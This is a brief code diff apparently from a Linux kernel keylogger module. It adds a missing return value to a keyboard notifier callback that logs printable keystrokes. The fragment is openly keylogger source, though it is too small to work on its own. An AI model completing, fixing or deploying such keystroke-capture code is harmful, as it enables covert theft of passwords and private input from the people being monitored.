@@ -140,6 +140,8 @@ static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void 
             log_printable(param->value); // text: uses same logic for both
             break;
     }
+
+    return NOTIFY_OK;
 }
 
 static struct notifier_block keylogger_nb =
